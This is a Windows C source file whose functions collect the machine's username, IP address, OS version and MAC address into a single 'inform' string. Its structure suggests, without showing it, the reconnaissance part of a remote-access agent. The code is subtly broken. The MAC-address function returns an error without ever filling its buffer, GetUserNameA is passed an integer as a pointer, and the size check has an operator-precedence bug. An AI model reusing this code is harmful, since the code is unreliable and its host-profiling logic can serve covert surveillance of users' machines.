#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <lmcons.h>
#include <lm.h>

#include "config.h"

#define INFORM_FMT "%s\n%s\n%s\n%s\n"

const int fmtLen = strlen(INFORM_FMT);

void getMacAddress(char buffer[BUF_SIZE])
{
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);

    if (pAdapterInfo == NULL)
    {
        printf("[E] Error allocating memory needed to call GetAdaptersInfo\n");
        return;
    }

    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            printf("[E] Error allocating memory needed to call GetAdaptersInfo\n");
            return;
        }
    }

    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter)
    {
        printf("[E] Error calling GetAdaptersInfo\n");
        return;
    }

    free(pAdapterInfo);
}

void getIpAddress(char buffer[BUF_SIZE])
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("[E] Error initializing Winsock\n");
        return;
    }
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        printf("[E] Error retrieving hostname\n");
        return;
    }
    struct hostent *host;
    if ((host = gethostbyname(hostname)) == NULL)
    {
        printf("[E] Error retrieving host information\n");
        return;
    }
    struct in_addr **addr_list;
    addr_list = (struct in_addr **)host->h_addr_list;
    snprintf(buffer, BUF_SIZE, "IP Address: %s\n", inet_ntoa(*addr_list[0]));
    WSACleanup();
}

char *parseVersion(DWORD major, DWORD minor)
{
    switch (major)
    {
    case 10:
        if (minor == 0)
            return "Windows 10";
        else
            return "Unknown";
        break;
    case 6:
        switch (minor)
        {
        case 3:
            return "Windows 8.1";
            break;
        case 2:
            return "Windows 8";
            break;
        case 1:
            return "Windows 7";
            break;
        case 0:
            return "Windows Vista";
            break;
        default:
            return "Unknown";
            break;
        }
        break;
    case 5:
        if (minor == 1)
            return "Windows XP";
        break;
    default:
        return "Unknown";
        break;
    }
}

void getOperatingSystem(char buffer[BUF_SIZE])
{
    DWORD dwVersion = GetVersion();
    snprintf(buffer, BUF_SIZE, "Operating System: %s", parseVersion((DWORD)(LOBYTE(LOWORD(dwVersion))), (DWORD)(HIBYTE(LOWORD(dwVersion)))));
}

void getUsername(char buffer[BUF_SIZE])
{
    char username[BUF_SIZE];
    GetUserNameA(username, (LPDWORD)BUF_SIZE);
    snprintf(buffer, BUF_SIZE, "Username: %s", username);
}

int getTotalSize(char *buffer[], int size)
{
    int totalSize = 0;
    for (int i = 0; i < size; i++)
    {
        totalSize += strlen(buffer[i]);
    }
    return totalSize;
}

void truncate(char *buffer, int bufferSize)
{
    buffer[bufferSize / 2] = '\0';
}

void getInformation(char buffer[BUF_SIZE])
{
    char username[BUF_SIZE], ipAddress[BUF_SIZE], operatingSystem[BUF_SIZE], macAddress[BUF_SIZE];
    getUsername(username);
    getIpAddress(ipAddress);
    getOperatingSystem(operatingSystem);
    getMacAddress(macAddress);

    int numInf = 4;
    char *fields[numInf] = {username, ipAddress, operatingSystem, macAddress};
    while (TRUE)
    {
        if (!getTotalSize(fields, numInf) > BUF_SIZE - fmtLen)
        {
            break;
        }
        for (int i = 0; i < numInf; i++)
        {
            truncate(fields[i], BUF_SIZE >> i);
        }
    }
    snprintf(buffer, BUF_SIZE, INFORM_FMT, username, ipAddress, operatingSystem, macAddress);
}
